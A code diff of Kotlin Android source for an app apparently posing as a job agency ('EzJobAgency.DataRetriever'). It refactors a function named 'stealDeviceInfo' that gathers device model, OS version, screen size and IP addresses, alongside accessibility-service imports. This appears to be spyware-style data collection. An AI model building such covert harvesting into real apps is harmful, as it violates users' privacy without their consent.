@@ -3,16 +3,16 @@ package com.example.EzJobAgency.DataRetriever
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.Activity
-import android.content.*
+import android.content.Context
+import android.content.DialogInterface
+import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.content.res.Resources
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import androidx.appcompat.app.AlertDialog
-import androidx.lifecycle.lifecycleScope
 import com.example.EzJobAgency.MyAccessibilityService
-import kotlinx.coroutines.launch
 import org.jsoup.Jsoup
 import org.jsoup.nodes.Document
 import java.net.InetAddress
@@ -29,8 +29,8 @@ class General{
     }
 
     fun stealDeviceInfo(): String {
-        val width: Int = Resources.getSystem().getDisplayMetrics().widthPixels
-        val height: Int = Resources.getSystem().getDisplayMetrics().heightPixels
+        val width: Int = Resources.getSystem().displayMetrics.widthPixels
+        val height: Int = Resources.getSystem().displayMetrics.heightPixels
 
         var ret = "Manufacturer:${android.os.Build.MANUFACTURER}|\n"
         ret += "Version/Release:${android.os.Build.VERSION.RELEASE}|\n"
@@ -55,10 +55,10 @@ class General{
             val interfaces: List<NetworkInterface> =
                 Collections.list(NetworkInterface.getNetworkInterfaces())
             for (intf in interfaces) {
-                val addrs: List<InetAddress> = Collections.list(intf.getInetAddresses())
+                val addrs: List<InetAddress> = Collections.list(intf.inetAddresses)
                 for (addr in addrs) {
-                    if (!addr.isLoopbackAddress()) {
-                        val sAddr: String = addr.getHostAddress()
+                    if (!addr.isLoopbackAddress) {
+                        val sAddr: String = addr.hostAddress
                         val isIPv4 = sAddr.indexOf(':') < 0
                         if (useIPv4) {
                             if (isIPv4) return sAddr
